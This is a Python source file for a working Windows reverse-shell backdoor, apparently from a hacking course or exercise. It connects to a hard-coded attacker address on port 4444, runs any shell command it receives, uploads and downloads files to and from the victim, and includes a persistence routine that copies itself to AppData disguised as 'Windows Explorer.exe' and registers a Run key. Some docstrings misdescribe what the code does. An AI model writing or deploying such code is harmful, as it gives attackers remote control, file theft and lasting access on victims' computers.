import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    """
    This Backdoor class generates a connection to the server machine and allow the hacker to send commands to the terminal.

    """

    def __init__(self, ip, port):
        """
        This constructor creates a connection object using an IP address and port.

        Args:
            ip (string): IP address of the hacker machine
            port (int): The port in which the comunication is occurring
        """
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        """
        This method creates a new folder in the hacker's machine and copy the reverse_backdoor.py file to it
        Then is start up everytime the is turned on.
        """
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' +
                            evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        """
        This method send the data to the server and waits for the response
        Args:
            data (json): The data to send
        """
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        """ 
        This method receive the data and decode it

        Returns:
            json: The decoded data
        """
        json_data = b""  # b is for bytes and "" is for empty string, this is the beginning of the data
        while True:
            try:
                json_data += self.connection.recv(1024)  # Receive the data
                return json.loads(json_data)  # Decode the data
            except ValueError:
                continue

    def execute_system_command(self, command):
        """
        This method execute the command in the terminal, then the return output will be sent to DEVNULL to avoid displaying it in the terminal.

        Args:
            command (String): The command to execute

        Returns:
            Bytes : The output of the command
        """
        return subprocess.check_output(command, shell=True)

    def change_working_dir_to(self, path):
        os.chdir(path)  # Change the working directory to path
        return "[+] Changing working directory to " + path

    def write_file(self, file_name, data):
        with open(file_name, 'wb') as f:
            # Fix the bug that prevents from downloading images and other non-text files
            decoded_data = base64.b64decode(data)
            f.write(decoded_data)
            return '[+] Upload successful.'

    def read_file(self, path):
        """
        This method read the file from the hacker machine and return the data encoded 
        Args:
            path (string): The path of the file to read

        Returns:
            data: The data of the file encoded as base64
        """
        with open(path, 'rb') as file:
            data = file.read()
            # Fix the bug that prevents from downloading images and other non-text files
            return base64.b64encode(data)

    def start(self):
        """
        After the connection is established this keep the connection open and send the outputs of the commands in the terminal

        """
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_dir_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(
                        command).decode()  # Execute the command and return the output
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)


my_backdoor = Backdoor('192.168.1.12', 4444)
my_backdoor.start()
